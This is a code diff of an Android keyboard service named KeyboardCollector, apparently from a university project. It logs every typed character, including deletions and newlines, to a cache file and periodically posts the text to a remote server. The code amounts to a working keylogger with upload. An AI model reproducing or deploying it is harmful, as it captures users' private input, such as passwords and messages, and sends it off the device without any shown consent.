@@ -35,7 +35,7 @@ import java.util.TimerTask;
 import hr.fer.connection.HTTPURLConnection;
 import hr.fer.keyboard.R;
 
-public class KeyboardCollector extends  InputMethodService
+public class KeyboardCollectorService extends  InputMethodService
         implements KeyboardView.OnKeyboardActionListener {
     public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
     private final String PATH = "./cache.txt";
@@ -101,6 +101,7 @@ public class KeyboardCollector extends  InputMethodService
         switch (primaryCode) {
             case android.inputmethodservice.Keyboard.KEYCODE_DELETE:
                 ic.deleteSurroundingText(1, 0);
+                typedText.setLength(typedText.length() - 1);
                 break;
             case android.inputmethodservice.Keyboard.KEYCODE_SHIFT:
                 caps = !caps;
@@ -109,6 +110,7 @@ public class KeyboardCollector extends  InputMethodService
                 break;
             case android.inputmethodservice.Keyboard.KEYCODE_DONE:
                 ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
+                typedText.append("\n");
                 break;
             default:
                 char code = (char) primaryCode;
@@ -172,58 +174,28 @@ public class KeyboardCollector extends  InputMethodService
         stream.close();
     }
 
-    private class PostDataTOServer extends AsyncTask<Void, Void, Void> {
-        private String response = "";
-        private String contents = ";";
+    private String readFromCache() throws IOException {
+        int length = (int) cache.length();
+        byte[] bytes = new byte[length];
 
-        HashMap<String, String> postDataParams;
-        @Override
-        protected void onPreExecute() {
-            super.onPreExecute();
+        FileInputStream in = new FileInputStream(cache);
+        in.read(bytes);
+        String contents = new String(bytes);
 
-        }
-        @Override
-        protected Void doInBackground(Void... arg0) {
-            try {
-                readFromCache();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
+        Log.d("Read from cache", contents);
 
-            if(contents.length() == 0) return null;
+        cache.delete();
+        cache.createNewFile();
 
-            postDataParams = new HashMap<>();
-            postDataParams.put("id", String.valueOf(++id));
-            postDataParams.put("text", contents);
-            postDataParams.put("datetime", datetime.toString());
-
-            response = service.ServerData(SERVER_PATH,postDataParams);
-            return null;
-        }
-
-
-        private void readFromCache() throws IOException {
-            int length = (int) cache.length();
-            byte[] bytes = new byte[length];
-
-            FileInputStream in = new FileInputStream(cache);
-            in.read(bytes);
-            contents = new String(bytes);
-
-            Log.d("Read from cache", contents);
-
-            File path = getApplicationContext().getFilesDir();
-            cache = new File(path, "cache.txt");
-            cache.createNewFile();
-        }
-
-
+        return contents;
     }
 
     private class CacheTimer extends TimerTask{
 
         @Override
         public void run() {
+
+            //did I type something new?
             handler.post(new Runnable() {
                 @Override
                 public void run() {
@@ -235,6 +207,43 @@ public class KeyboardCollector extends  InputMethodService
             });
         }
     }
+
+    private class PostDataTOServer extends AsyncTask<Void, Void, Void> {
+        private String contents = ";";
+
+        HashMap<String, String> postDataParams;
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+
+        }
+        @Override
+        protected Void doInBackground(Void... arg0) {
+            String response;
+            String contents = "";
+            try {
+                contents = readFromCache();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+
+            if(contents.length() == 0) return null;
+
+            postDataParams = new HashMap<>();
+            postDataParams.put("id", String.valueOf(++id));
+            postDataParams.put("text", contents);
+            postDataParams.put("datetime", datetime.toString());
+            response = service.ServerData(SERVER_PATH,postDataParams);
+            return null;
+        }
+
+
+
+
+
+    }
+
+
 
 
 }
